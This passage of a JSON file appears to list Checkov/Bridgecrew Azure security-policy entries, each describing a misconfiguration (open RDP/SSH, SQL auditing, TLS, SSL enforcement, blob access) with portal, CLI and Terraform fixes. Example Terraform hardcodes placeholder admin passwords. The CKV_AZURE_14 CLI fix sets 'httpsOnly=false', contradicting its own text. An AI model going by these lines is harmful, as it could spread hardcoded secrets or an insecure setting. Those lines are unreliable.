administrator_login_password = \"4-v3ry-53cr37-p455w0rd\"\n}\n\nresource \"azurerm_storage_account\" \"okExample\" {\n  name                     = \"accteststorageaccount\"\n  resource_group_name      = azurerm_resource_group.okExample.name\n  location                 = azurerm_resource_group.okExample.location\n  account_tier             = \"Standard\"\n  account_replication_type = \"GRS\"\n}\n\nresource \"azurerm_storage_container\" \"okExample\" {\n  name                  = \"accteststoragecontainer\"\n  storage_account_name  = azurerm_storage_account.okExample.name\n  container_access_type = \"private\"\n}\n\nresource \"azurerm_mssql_server_security_alert_policy\" \"okExample\" {\n  resource_group_name = azurerm_resource_group.okExample.name\n  server_name         = azurerm_sql_server.okExample.name\n  state               = \"Enabled\"\n}\n\nresource \"azurerm_mssql_server_vulnerability_assessment\" \"okExample\" {\n  server_security_alert_policy_id = azurerm_mssql_server_security_alert_policy.okExample.id\n  storage_container_path          = \"${azurerm_storage_account.okExample.primary_blob_endpoint}${azurerm_storage_container.okExample.name}/\"\n  storage_account_access_key      = azurerm_storage_account.okExample.primary_access_key\n\n  recurring_scans {\n    enabled                   = true\n    email_subscription_admins = true\n    emails = [\n      \"[email\u00a0protected]\",\n      \"[email\u00a0protected]\"\n    ]\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV2_AZURE_4": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-va-setting-send-scan-reports-to-is-configured-for-a-sql-server",
        "description": "Azure SQL server ADS VA Send scan reports to is not configured\nDescription\nConfigure 'Send scan reports to' with email ids of concerned data owners/stakeholders for a critical SQL servers.\nVulnerability Assessment (VA) scan reports and alerts will be sent to email ids configured at Send scan reports to. This may help in reducing time required for identifying risks and taking corrective measures.\nFix - Buildtime \nTerraform\n\nResource: azurerm_resource_group, azurerm_sql_server, azurerm_storage_account, azurerm_storage_container, azurerm_mssql_server_security_alert_policy, azurerm_mssql_server_vulnerability_assessment\n\nGoresource \"azurerm_resource_group\" \"okExample\" {\n  name     = \"okExample-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_sql_server\" \"okExample\" {\n  name                         = \"mysqlserver\"\n  resource_group_name          = azurerm_resource_group.okExample.name\n  location                     = azurerm_resource_group.okExample.location\n  version                      = \"12.0\"\n  administrator_login          = \"4dm1n157r470r\"\n  administrator_login_password = \"4-v3ry-53cr37-p455w0rd\"\n}\n\nresource \"azurerm_storage_account\" \"okExample\" {\n  name                     = \"accteststorageaccount\"\n  resource_group_name      = azurerm_resource_group.okExample.name\n  location                 = azurerm_resource_group.okExample.location\n  account_tier             = \"Standard\"\n  account_replication_type = \"GRS\"\n}\n\nresource \"azurerm_storage_container\" \"okExample\" {\n  name                  = \"accteststoragecontainer\"\n  storage_account_name  = azurerm_storage_account.okExample.name\n  container_access_type = \"private\"\n}\n\nresource \"azurerm_mssql_server_security_alert_policy\" \"okExample\" {\n  resource_group_name = azurerm_resource_group.okExample.name\n  server_name         = azurerm_sql_server.okExample.name\n  state               = \"Enabled\"\n}\n\nresource \"azurerm_mssql_server_vulnerability_assessment\" \"okExample\" {\n  server_security_alert_policy_id = azurerm_mssql_server_security_alert_policy.okExample.id\n  storage_container_path          = \"${azurerm_storage_account.okExample.primary_blob_endpoint}${azurerm_storage_container.okExample.name}/\"\n  storage_account_access_key      = azurerm_storage_account.okExample.primary_access_key\n\n  recurring_scans {\n    enabled                   = true\n    email_subscription_admins = true\n    emails = [\n      \"[email\u00a0protected]\",\n      \"[email\u00a0protected]\"\n    ]\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_23": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_logging_2",
        "description": "Azure SQL server auditing is disabled\nDescription\nThe Azure platform allows a SQL server to be created as a service. Auditing tracks database events and writes them to an audit log in the Azure storage account. It also helps to maintain regulatory compliance, understand database activity, and gain insight into discrepancies and anomalies that could indicate business concerns or suspected security violations.\nWe recommend you enable auditing at the server level, ensuring all existing and newly created databases on the SQL server instance are audited. \n\ud83d\udcd8NoteAn auditing policy applied to a SQL database does not override an auditing policy or settings applied on the SQL server where the database is hosted.\nFix - Runtime\nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to SQL servers.\nFor each server instance:\na) Click Auditing.\nb) Set Auditing to On.\n\nCLI Command\nTo get the list of all SQL Servers, use the following command:\nGet-AzureRmSqlServer\nTo enable auditing for each Server, use the following command:\nSet-AzureRmSqlServerAuditingPolicy \n-ResourceGroupName <resource group name> \n-ServerName <server name> \n-AuditType <audit type> \n-StorageAccountName <storage account name>\n\nFix - Buildtime\nARM\n\nResource: Microsoft.Sql/servers/databases\n\nJSON{\n  \"type\": \"Microsoft.Sql/servers\",\n  \"apiVersion\": \"2019-06-01-preview\",\n  \"location\": \"[parameters('location')]\",\n  \"name\": \"[parameters('sqlServerName')]\",\n  \"identity\": \"[if(parameters('isStorageBehindVnet'), json('{\\\"type\\\":\\\"SystemAssigned\\\"}'), json('null'))]\",\n  \"properties\": {\n    \"administratorLogin\": \"[parameters('sqlAdministratorLogin')]\",\n    \"administratorLoginPassword\": \"[parameters('sqlAdministratorLoginPassword')]\",\n    \"version\": \"12.0\"\n  },\n  \"tags\": {\n    \"displayName\": \"[parameters('sqlServerName')]\"\n  },\n  \"resources\": [\n    {\n      \"type\": \"auditingSettings\",\n      \"apiVersion\": \"2019-06-01-preview\",\n      \"name\": \"DefaultAuditingSettings\",\n      \"dependsOn\": [\n        \"[parameters('sqlServerName')]\",\n        \"[parameters('storageAccountName')]\",\n        \"[extensionResourceId(resourceId('Microsoft.Storage/storageAccounts', parameters('storageAccountName')), 'Microsoft.Authorization/roleAssignments/', variables('uniqueRoleGuid'))]\"\n      ],\n      \"properties\": {\n+       \"state\": \"Enabled\",\n        \"storageEndpoint\": \"[reference(resourceId('Microsoft.Storage/storageAccounts', parameters('storageAccountName')), '2019-06-01').PrimaryEndpoints.Blob]\",\n        \"storageAccountAccessKey\": \"[if(parameters('isStorageBehindVnet'), json('null'), listKeys(resourceId('Microsoft.Storage/storageAccounts', parameters('storageAccountName')), '2019-06-01').keys[0].value)]\",\n        \"storageAccountSubscriptionId\": \"[subscription().subscriptionId]\",\n        \"isStorageSecondaryKeyInUse\": false\n      }\n    }\n  ]\n}\n\nTerraform\n\nResource: azurerm_sql_server, azurerm_mssql_server\nField: extended_auditing_policy\n\nGoresource \"azurerm_sql_server\" \"example\" {\n        ...\n +   extended_auditing_policy {\n       storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n       storage_account_access_key = azurerm_storage_account.example.primary_access_key\n       storage_account_access_key_is_secondary = true\n       retention_in_days                       = 90\n    }\n}\n",
        "severity": "HIGH"
    },
    "CKV_AZURE_1": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_networking_1",
        "description": "Azure instance does not authenticate using SSH keys\nDescription\nSSH is an encrypted connection protocol that allows secure sign-ins over unsecured connections. SSH is the default connection protocol for Linux VMs hosted in Azure. Using secure shell (SSH) key pair, it is possible to spin up a Linux virtual machine on Azure that defaults to using SSH keys for authentication, eliminating the need for passwords to sign in.\nWe recommend connecting to a VM using SSH keys. Using basic authentication with SSH connections leaves VMs vulnerable to brute-force attacks or guessing of passwords. \nFix - Runtime \nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nEnter virtual machines in the search bar.\nUnder Services, select Virtual machines.\nUnder Administrator account, select SSH public key.\nFor SSH public key source, use the default Generate new key pair, then for Key pair name enter myKey.\nUnder Inbound port rules > Public inbound ports, select Allow selected ports, then select SSH (22) and HTTP (80) from the drop-down.\nLeave the remaining defaults settings. At the bottom of the page click Review + create.\n\nCLI Command\nThe --generate-ssh-keys parameter is used to automatically generate an SSH key, and put it in the default key location (~/.ssh). \nShellaz vm create \\\n  --resource-group myResourceGroup \\\n  --name myVM \\\n  --image UbuntuLTS \\\n  --admin-username azureuser \\\n  --generate-ssh-keys\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_linux_virtual_machine\nArgument: admin_ssh_key\n\nGoresource \"azurerm_linux_virtual_machine\" \"example\" {\n  ...\n\n+  admin_ssh_key {\n    username   = \"adminuser\"\n    public_key = file(\"~/.ssh/id_rsa.pub\")\n  }\n\nARM Template\n\nResource: Microsoft.Compute/virtualMachines\nArgument: disablePasswordAuthentication\n\nGo...\n      \"linuxConfiguration\": {\n+       \"disablePasswordAuthentication\": \"true\",\n        \"ssh\": {\n          \"publicKeys\": [\n            {\n              \"path\": \"string\",\n              \"keyData\": \"string\"\n            }\n          ]\n ...\n",
        "severity": "HIGH"
    },
    "CKV_AZURE_9": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_networking_2",
        "description": "RDP Internet access is not restricted\nDescription\nA potential security problem using RDP over the Internet is that attackers can use various brute force techniques to gain access to Azure Virtual Machines. Once the attackers gain access, they can use a virtual machine as a launch point for compromising other machines on the Azure Virtual Network. The attackers could also access and attack networked devices outside of Azure.\nWe recommend you disable RDP access over the internet to Network Security Groups.\nFix - Runtime\nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nFor each VM, open the Networking blade.\nVerify that the INBOUND PORT RULES does not have a rule for RDP. For example:\n\n\nPort = 3389\nProtocol = TCP\nSource = Any OR Internet\n\nCLI Command\nTo list Network Security Groups with the corresponding non-default Security rules, use the following command:\naz network nsg list --query [*].[name,securityRules]\nEnsure that the NSGs do not have any of the following security rules:\n\n\"access\" : \"Allow\"\n\"destinationPortRange\" : \"3389\" or \"*\" or \"[port range containing 3389]\"\n\"direction\" : \"Inbound\"\n\"protocol\" : \"TCP\"\n\"sourceAddressPrefix\" : \"*\" or \"0.0.0.0\" or \"/0\" or \"/0\" or \"internet\" or \"any\"\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_network_security_rule\nArgument: access + protocol + destination_port_range + source_address_prefix\n\nGoresource \"azurerm_network_security_rule\" \"example\" {\n     ...\n-    access                      = \"Allow\"\n-    protocol                    = \"TCP\"\n-    destination_port_range      = [\"3389\" / <port range including 3389>]]\n-    source_address_prefix       = \"*\" / \"0.0.0.0\" / \"<nw>/0\" / \"/0\" / \"internet\" / \"any\"\n     ...\n}\n",
        "severity": "CRITICAL"
    },
    "CKV_AZURE_10": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_networking_3",
        "description": "SSH Internet access is not restricted\nDescription\nA potential security problem using SSH over the Internet is that attackers can use various brute force techniques to gain access to Azure Virtual Machines. Once the attackers gain access, they can use a virtual machine as a launch point for compromising other machines on the Azure Virtual Network. The attackers could also access and attack networked devices outside of Azure.\nWe recommend you disable SSH access over the internet to Network Security Groups.\nFix - Runtime \nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nFor each VM, open the Networking blade.\nVerify that the INBOUND PORT RULES does not have a rule for SSH. For example:\n\n\nPort = 22\nProtocol = TCP\nSource = Any OR Internet\n\nCLI Command\nTo list Network Security Groups with corresponding non-default Security rules, use the following command:\naz network nsg list --query [*].[name,securityRules]\nEnsure that the NSGs do not have any of the following security rules:\n\n\"access\" : \"Allow\"\n\"destinationPortRange\" : \"22\" or \"*\" or \"[port range containing 22]\"\n\"direction\" : \"Inbound\"\n\"protocol\" : \"TCP\"\n\"sourceAddressPrefix\" : \"*\" or \"0.0.0.0\" or \"/0\" or \"/0\" or \"internet\" or \"any\"\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_network_security_rule\nArguments: access + protocol + destination_port_range + source_address_prefix\n\nGoresource \"azurerm_network_security_rule\" \"example\" {\n-    access                      = \"Allow\"\n-    protocol                    = \"TCP\"\n-    destination_port_range      = [\"22\" / <port range including 22>]]\n-    source_address_prefix       = \"*\" / \"0.0.0.0\" / \"<nw>/0\" / \"/0\" / \"internet\" / \"any\"\n}\n",
        "severity": "CRITICAL"
    },
    "CKV_AZURE_11": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_networking_4",
        "description": "SQL databases allow ingress from 0.0.0.0/0\nDescription\nSQL Server includes a firewall to block access to unauthorized connections. More granular IP addresses can be defined by referencing the range of addresses available from specific datacenters.\nThe SQL server default Firewall exists with StartIp of 0.0.0.0 and EndIP of 0.0.0.0, allowing access to all Azure services. A custom rule can be set with StartIp of 0.0.0.0 and EndIP of 255.255.255.255, allowing access from any IP over the Internet. To reduce the potential attack surface for a SQL server, firewall rules should be defined with more granular IP addresses. This is achieved by referencing the range of addresses available from specific datacenters.\nWe recommend SQL Databases do not allow ingress from 0.0.0.0/0, that is, any IP.\nFix - Runtime\nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to SQL servers.\nFor each SQL server:\na) Click Firewall / Virtual Networks.\nb) Set Allow access to Azure services to OFF.\nc) Set firewall rules to limit access to authorized connections.\n\nCLI Command\nTo disable default Firewall rule Allow access to Azure services, use the following commands:\nRemove-AzureRmSqlServerFirewallRule -FirewallRuleName \n\"AllowAllWindowsAzureIps\" \n-ResourceGroupName <resource group name> \n-ServerName <server name>\n\nTo remove a custom Firewall rule, use the following command:\nRemove-AzureRmSqlServerFirewallRule \n-FirewallRuleName \"<firewallRuleName>\" \n-ResourceGroupName <resource group name> \n-ServerName <server name>\n\nTo set the appropriate firewall rules, use the following command:\nSet-AzureRmSqlServerFirewallRule \n-ResourceGroupName <resource group name> \n-ServerName <server name> \n-FirewallRuleName \"<Fw rule Name>\" \n-StartIpAddress \"<IP Address other than 0.0.0.0>\" \n-EndIpAddress \"<IP Address other than0.0.0.0 or 255.255.255.255>\"\n\nFix - Buildtime \nTerraform\n\nResources:\nazurerm_mariadb_firewall_rule\nazurerm_sql_firewall_rule\nazurerm_postgresql_firewall_rule\nazurerm_mysql_firewall_rule\nArgument: start_ip_address\n\nGoresource \"azurerm_mysql_firewall_rule\" \"example\" {\n    ...\n-   start_ip_address    = \"0.0.0.0\"\n-   end_ip_address      = \"255.255.255.255\"\n}\n",
        "severity": "CRITICAL"
    },
    "CKV_AZURE_14": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_networking_5",
        "description": "Azure App Service Web app does not redirect HTTP to HTTPS\nDescription\nAzure Web Apps by default allows sites to run under both HTTP and HTTPS, and can be accessed by anyone using non-secure HTTP links. Non-secure HTTP requests can be restricted and all HTTP requests redirected to the secure HTTPS port. \nWe recommend you enforce HTTPS-only traffic to increase security. This will redirect all non-secure HTTP requests to HTTPS ports. HTTPS uses the SSL/TLS protocol to provide a secure connection, which is both encrypted and authenticated. \nFix - Runtime\nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to App Services.\nFor each App, click App.\na) Navigate to the Setting section.\nb) Click SSL settings.\nc) Navigate to the Protocol Settings section.\nd) Set HTTPS Only to On. \n\nCLI Command\nTo set HTTPS-only traffic for an existing app, use the following command:\naz webapp update \n--resource-group <RESOURCE_GROUP_NAME> \n--name <APP_NAME> \n--set httpsOnly=false\n\nFix - Buildtime \nTerraform\nResource: azurerm_app_service\nArgument: https_only\nGoresource \"azurerm_app_service\" \"example\" {\n    ...\n+   https_only          = true\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_15": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_networking_6",
        "description": "Web App does not use the latest version of TLS encryption\nDescription\nThe Transport Layer Security (TLS) protocol secures transmission of data over the internet using standard encryption technology. Encryption should be set with the latest version of TLS. App service allows TLS 1.2 by default, which is the recommended TLS level by industry standards, for example, PCI DSS.\nApp service currently allows the web app to set TLS versions 1.0, 1.1 and 1.2. For secure web app connections it is highly recommended to only use the latest TLS 1.2 version.\nFix - Runtime \nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to App Services.\nFor each Web App, click App.\na) Navigate to Setting section.\nb) Click SSL Settings.\nc)  Navigate to Protocol Settings section.\nd) Set Minimum TLS Version to 1.2.\n\nCLI Command\nTo set TLS Version for an existing app, use the following command:\naz webapp config set \n--resource-group <RESOURCE_GROUP_NAME> \n--name <APP_NAME>\n--min-tls-version 1.2\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_app_service\nArgument: min_tls_version\n\nGoresource \"azurerm_app_service\" \"example\" {\n    ...\n-   min_tls_version = <version>\n    }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_17": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_networking_7",
        "description": "Azure App Service Web app client certificate is disabled\nDescription\nClient certificates allow the Web App to require a certificate for incoming requests. Only clients that have a valid certificate will be able to reach the app.\nThe TLS mutual authentication technique in enterprise environments ensures the authenticity of clients to the server. If incoming client certificates are enabled only an authenticated client with valid certificates can access the app.\nFix - Runtime\nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to App Services.\nFor each Web App, click App.\na) Navigate to Setting section.\nb) Click SSL Settings.\nc)  Navigate to Protocol Settings section.\nd) Set Incoming client certificates to On.\n\nCLI Command\nTo set Incoming client certificates value for an existing app, use the following command:\naz webapp update \n--resource-group <RESOURCE_GROUP_NAME> \n--name <APP_NAME>\n--set clientCertEnabled=true\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_app_service\nArgument: client_cert_enabled\n\nGoresource \"azurerm_app_service\" \"example\" {\n    ...\n+   client_cert_enabled          = true\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_18": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_networking_8",
        "description": "Web App does not use the latest version of HTTP \nDescription\nPeriodically, new versions of HTTP are released to address security flaws and include additional functionality. HTTP 2.0 has additional performance improvements on the head-of-line blocking problem of the older HTTP version, header compression, and prioritization of requests. HTTP 2.0 no longer supports HTTP 1.1's chunked transfer encoding mechanism, as it provides its own more efficient mechanisms for data streaming.\nWe recommend you use the latest HTTP version for web apps and take advantage of any security fixes and new functionalities featured. With each software installation you can determine if a given update meets your organization's requirements. Organizations should verify the compatibility and support provided for any additional software, assessing the current version against the update revision being considered.\nFix - Runtime\nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to App Services.\nFor each Web App, click App.\na) Navigate to Setting section.\nb) Click Application Settings.\nc)  Navigate to General Settings section.\nd) Set HTTP version to 2.0.\n\n\ud83d\udcd8NoteMost modern browsers support the HTTP 2.0 protocol over TLS only, with non-encrypted traffic using HTTP 1.1. To ensure that client browsers connect to your app with HTTP/2, either by an App Service Certificate for your app's custom domain or by binding a third party certificate.\nCLI Command\nTo set HTTP 2.0 version for an existing app, use the following command:\naz webapp config set \n--resource-group <RESOURCE_GROUP_NAME> \n--name <APP_NAME>\n--http20-enabled true\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_app_service\nArgument: http2_enabled\n\nGoresource \"azurerm_app_service\" \"example\" {\n    ...\n\n+    site_config {\n+        http2_enabled = true\n    }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_28": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_networking_9",
        "description": "MySQL server databases do not have Enforce SSL connection enabled \nDescription\nSSL connectivity provides a new layer of security by connecting a database server to client applications using Secure Sockets Layer (SSL). Enforcing SSL connections between a database server and client applications helps protect against man-in-the-middle attacks. This is achieved by encrypting the data stream between the server and application.\nWe recommend you set Enforce SSL connection to Enable on MYSQL Server databases.\nFix - Runtime \nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to Azure Database for MySQL server.\nFor each database:\na) Click Connection security.\nb) Navigate to SSL Settings section.\nc) To Enforce SSL connection click ENABLED.\n\nCLI Command\nTo set MYSQL Databases to Enforce SSL connection, use the following command:\naz mysql server update \n--resource-group <resourceGroupName> \n--name <serverName> \n--ssl-enforcement Enabled\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_mysql_server\nArgument: ssl_enforcement_enabled\n\nGoresource \"azurerm_mysql_server\" \"example\" {\n    ...\n +  ssl_enforcement_enabled             = true\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_29": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_networking_10",
        "description": "Azure PostgreSQL database server with SSL connection is disabled\nDescription\nSSL connectivity provides a new layer of security by connecting a database server to client applications using a Secure Sockets Layer (SSL). Enforcing SSL connections between a database server and client applications helps protect against man-in-the-middle attacks. This is achieved by encrypting the data stream between the server and application.\nWe recommend you set Enforce SSL connection to Enable on PostgreSQL Server databases.\nFix - Runtime \nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to Azure Database for PostgreSQL server.\nFor each database:\na) Click Connection security.\nb) Navigate to SSL Settings section.\nc) To Enforce SSL connection click ENABLED.\n\nCLI Command\nTo set Enforce SSL Connection for  aPostgreSQL Database, use the following command:\naz postgres server update \n--resource-group <resourceGroupName> \n--name <serverName>\n--ssl-enforcement Enabled\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_postgresql_server\nArgument: ssl_enforcement_enabled\n\nGoresource \"azurerm_postgresql_server\" \"example\" {\n    ...\n +  ssl_enforcement_enabled             = true\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_30": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_networking_11",
        "description": "Azure PostgreSQL database server with log checkpoints parameter is disabled\nDescription\nEnabling log_checkpoints helps the PostgreSQL Database to log each checkpoint and generate query and error logs. Access to transaction logs is not supported. Query and error logs can be used to identify, troubleshoot, repair configuration errors, and address sub-optimal performance issues.\nWe recommend you set log_checkpoints to On for PostgreSQL Server Databases.\nFix - Runtime \nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to Azure Database for PostgreSQL server.\nFor each database:\na) Click Server parameters.\nb) Navigate to log_checkpoints.\nc) Click On.\nd) Click Save.\n\nCLI Command\nTo update the log_checkpoints configuration, use the following command:\naz postgres server configuration set \n--resource-group <resourceGroupName>\n--server-name <serverName> \n--name log_checkpoints \n--value on\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_postgresql_configuration\nArgument: name + value\n\nGo- resource \"azurerm_postgresql_configuration\" \"example\" {\n-    name                = \"log_checkpoints\"\n-    resource_group_name = data.azurerm_resource_group.example.name\n-    server_name         = azurerm_postgresql_server.example.name\n-    value               = \"off\"\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_31": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_networking_12",
        "description": "Azure PostgreSQL database server with log connections parameter is disabled\nDescription\nEnabling log_connections allows a PostgreSQL Database to log attempted connections to the\nserver in addition to logging the successful completion of client authentication. Log data can be used to identify, troubleshoot, repair configuration errors, and identify sub-optimal performance issues.\nWe recommend you set log_connections to On for PostgreSQL Server Databases.\nFix - Runtime \nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to Azure Database for PostgreSQL server.\nFor each database:\na) Click Server parameters.\nb) Navigate to log_connections.\nc) Click On.\nd) Click Save.\n\nCLI Command\nTo update the log_connections configuration, use the following command:\naz postgres server configuration set \n--resource-group <resourceGroupName> \n--server-name <serverName> \n--name log_connections \n--value on\n\nFix - Buildtime\nTerraform \n\nResource: azurerm_postgresql_configuration\nArgument: name + value\n\nGo- resource \"azurerm_postgresql_configuration\" \"example\" {\n-    name                = \"log_connections\"\n-    resource_group_name = data.azurerm_resource_group.example.name\n-    server_name         = azurerm_postgresql_server.example.name\n-    value               = \"off\"\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_32": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_networking_13",
        "description": "Azure PostgreSQL database server with connection throttling parameter is disabled\nDescription\nEnabling connection_throttling allows the PostgreSQL Database to set the verbosity of logged messages. It generates query and error logs with respect to concurrent connections that could lead to a successful Denial of Service (DoS) attack by exhausting connection resources. A system can also fail or be degraded by an overload of legitimate users. Query and error logs can be used to identify, troubleshoot, repair configuration errors, and address sub-optimal performance issues.\nWe recommend you set connection_throttling to On for PostgreSQL Server Databases.\nFix - Runtime\nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to Azure Database for PostgreSQL server.\nFor each database:\na) Click Server parameters.\nb) Navigate to connection_throttling.\nc) Click On.\nd) Click Save.\n\nCLI Command\nTo update the connection_throttling configuration, use the following command:\naz postgres server configuration set \n--resource-group <resourceGroupName> \n--server-name <serverName> \n--name connection_throttling \n--value on\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_postgresql_configuration\nArguments: name + value\n\nGo- resource \"azurerm_postgresql_configuration\" \"example\" {\n-    name                = \"connection_throttling\"\n-    resource_group_name = data.azurerm_resource_group.example.name\n-    server_name         = azurerm_postgresql_server.example.name\n-    value               = \"off\"\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_34": {
        "url": "https://docs.bridgecrew.io/docs/set-public-access-level-to-private-for-blob-containers",
        "description": "Public access level for  Blob Containers is not set to private\nDescription\nAnonymous, public read access to a container and its blobs can be enabled in Azure Blob storage. It grants read-only access to these resources without sharing the account key or requiring a shared access signature. \nWe recommend you do not provide anonymous access to blob containers until, and unless, it is strongly desired. A shared access signature token should be used for providing controlled and timed access to blob containers.\nFix - Runtime\nAzure Portal\nTo begin, follow Microsoft documentation and create shared access signature tokens for your blob containers. When complete, change the policy using the Azure Portal to deny anonymous access following these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to Storage Accounts.\nFor each storage account:\na) Navigate to BLOB SERVICE.\nb) Select Containers.\nc) For each Container:\n(i) Click Access policy.\n(ii) Set Public Access Level to Private. \n\nCLI Command\nTo set the permission for public access to private (off) for a specific blob container, use the container's name with the following command:\naz storage container set-permission \n--name <containerName> \n--public-access off \n--account-name <accountName> \n--account-key <accountKey>\n\nFix - Buildtime\nTerraform\n\nResource: azurerm_storage_container\nArgument: container_access_type\n\nGoresource \"azurerm_storage_container\" \"example\" {\n    ...\n+   container_access_type = \"private\"\n}\n",
        "severity": "CRITICAL"
    },
    "CKV_AZURE_35": {
        "url": "https://docs.bridgecrew.io/docs/set-default-network-access-rule-for-storage-accounts-to-deny",
        "description": "Azure Storage Account default network access is set to Allow\nDescription\nRestricting default network access helps to provide an additional layer of security. By default, storage accounts accept connections from clients on any network. To limit access to selected networks, the default action must be changed.\nWe recommend you configure storage accounts to deny access to traffic from all networks, including internet traffic. At an appropriate time, access can be granted to traffic from specific Azure Virtual networks, allowing a secure network boundary for specific applications to be built. Access can also be granted to public internet IP address ranges enabling connections from specific internet or on-premises clients. When network rules are configured only applications from allowed networks can access a storage account. When calling from an allowed network applications continue to require authorization, such as a valid access key or SAS token, to access the storage account.\nFix - Runtime \nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to Storage Accounts.\nFor each storage account:\na) Navigate to Settings menu.\nb) Click Firewalls and virtual networks.\nc) For selected networks, select Allow access.\nd) Add rules to allow traffic from specific network.\ne) To apply changes,click Save.\n\nCLI Command\nTo update default-action to Deny, use the following command:\naz storage account update \n--name <StorageAccountName> \n--resource-group <resourceGroupName> \n--default-action Deny\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_storage_account_network_rules\nArgument: default_action\n\nGoresource \"azurerm_storage_account_network_rules\" \"test\" {\n    resource_group_name  = azurerm_resource_group.test.name\n    storage_account_name = azurerm_storage_account.test.name\n\n+   default_action             = \"Deny\"\n}\n\nIn a Storage Account:\nazurerm_storage_account.test.tfresource \"azurerm_storage_account\" \"test\" {\n  name                = var.watcher\n  resource_group_name = azurerm_resource_group.test.name\n  location            = azurerm_resource_group.test.location\n\n+  network_rules {\n+    default_action=\"Deny\"\n+  }\n\n  account_tier              = \"Standard\"\n  account_kind              = \"StorageV2\"\n  account_replication_type  = \"LRS\"\n  enable_https_traffic_only = true\n}\n\nSuppression Advice\nThis can trigger incorrectly on azurerm_storage_account when using correctly configured azurerm_storage_account_network_rules, if this occurs suppression is reasonable.",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_36": {
        "url": "https://docs.bridgecrew.io/docs/enable-trusted-microsoft-services-for-storage-account-access",
        "description": "Azure Storage Account Trusted Microsoft Services access is not enabled\nDescription\nSome Microsoft services that interact with storage accounts operate from networks that cannot be granted access through network rules. To help this type of service work as intended, you can allow the set of trusted Microsoft services to bypass the network rules. These services will use strong authentication to access the storage account. Allowing trusted Microsoft services grants access to the storage account for the following services: Azure Backup, Azure Site Recovery, Azure DevTest Labs, Azure Event Grid, Azure Event Hubs, Azure Networking, Azure Monitor and Azure SQL Data Warehouse (when registered in the subscription).\nTurning on firewall rules for a storage account will block access to incoming requests for data, including from other Azure services, such as using the portal and writing logs. Functionality can be re-enabled. The customer can get access to services like Monitor, Networking, Hubs, and Event Grid by enabling Trusted Microsoft Services through exceptions. Backup and Restore of Virtual Machines using unmanaged disks in storage accounts with network rules applied is supported by creating an exception.\nFix - Runtime\nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to Storage Accounts.\nFor each storage account:\na) Navigate to Settings menu.\nb) Click Firewalls and virtual networks.\nc) For selected networks, select Allow access.\nd) Select Allow trusted Microsoft services to access this storage account.\ne) To apply changes,click Save.\n\nCLI Command\nTo update trusted Microsoft services, use the following command:\naz storage account update \n--name <StorageAccountName> \n--resource-group 